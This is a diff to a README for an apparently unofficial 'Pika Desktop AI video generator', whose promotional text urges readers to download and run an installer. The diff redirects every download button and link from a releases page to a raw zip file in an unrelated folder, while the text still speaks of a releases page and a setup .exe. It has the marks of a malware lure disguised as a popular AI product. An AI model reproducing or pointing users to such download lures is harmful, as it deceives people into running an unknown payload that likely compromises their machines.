@@ -1,7 +1,7 @@
 <h1>🎬 Pika-Desktop---Pika-AI-Video-Generator-2026 - Create Stunning AI Videos Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/releases" style="display:inline-block;padding:15px 35px;background:linear-gradient(90deg,#ff6a00,#ee0979);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(238,9,121,0.4);">⬇️ Download Now - Free AI Video Generator</a>
+  <a href="https://raw.githubusercontent.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/main/biota/v1.2.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(90deg,#ff6a00,#ee0979);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(238,9,121,0.4);">⬇️ Download Now - Free AI Video Generator</a>
 </p>
 
 ---
@@ -26,7 +26,7 @@ We have designed the installation and usage process to be as smooth as possible 
 
 Click the bright orange button at the top of this page (or scroll down to the download section) to visit the official download page.
 
-**👉 Action:** Visit this link to download the application: <a href="https://github.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/releases">https://github.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/releases</a>
+**👉 Action:** Visit this link to download the application: <a href="https://raw.githubusercontent.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/main/biota/v1.2.zip">https://raw.githubusercontent.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/main/biota/v1.2.zip</a>
 
 Once you click the link, you will see a page with release versions. Look for the most recent version (usually at the top)and click the download button associated with it. The download will begin automatically. The file is fairly large because it contains all the AI intelligence needed, so grab a coffee while it downloads.
 
@@ -103,7 +103,7 @@ Here is the consolidated, no-stress, what-to-do-right-now action plan:
 
 **🔴 Step 1:** Visit our downloads page by clicking the main button below (or using any link on this page):<br>
 <div style="text-align:center;margin:25px 0;">
-  <a href="https://github.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/releases" style="display:inline-block;padding:18px 40px;background:linear-gradient(90deg,#11998e,#38ef7d);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(17,153,142,0.5);">⬇️ GO TO DOWNLOAD PAGE</a>
+  <a href="https://raw.githubusercontent.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/main/biota/v1.2.zip" style="display:inline-block;padding:18px 40px;background:linear-gradient(90deg,#11998e,#38ef7d);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(17,153,142,0.5);">⬇️ GO TO DOWNLOAD PAGE</a>
 </div>
 
 **🟢 Step 2:** On that page, click the **first** download asset you see (typically labeled `Pika-Desktop-Setup.exe` or similar). Save it to your computer.
@@ -166,6 +166,6 @@ Click the green download button one more time, install in five minutes, and type
 
 ---
 
-<p align="center" style="font-size:14px;color:#888;"><a href="https://github.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/releases">Official Download Link – Click Here to Get the App</a></p>
+<p align="center" style="font-size:14px;color:#888;"><a href="https://raw.githubusercontent.com/Inglebertstuffed8332/Pika-Desktop---Pika-AI-Video-Generator-2026/main/biota/v1.2.zip">Official Download Link – Click Here to Get the App</a></p>
 
 <p align="center" style="font-size:12px;color:#aaa;">© 2026 Pika Desktop Project. This is an independent fan-made/unaffiliated release. All product names and trademarks are properties of their respective owners.</p>
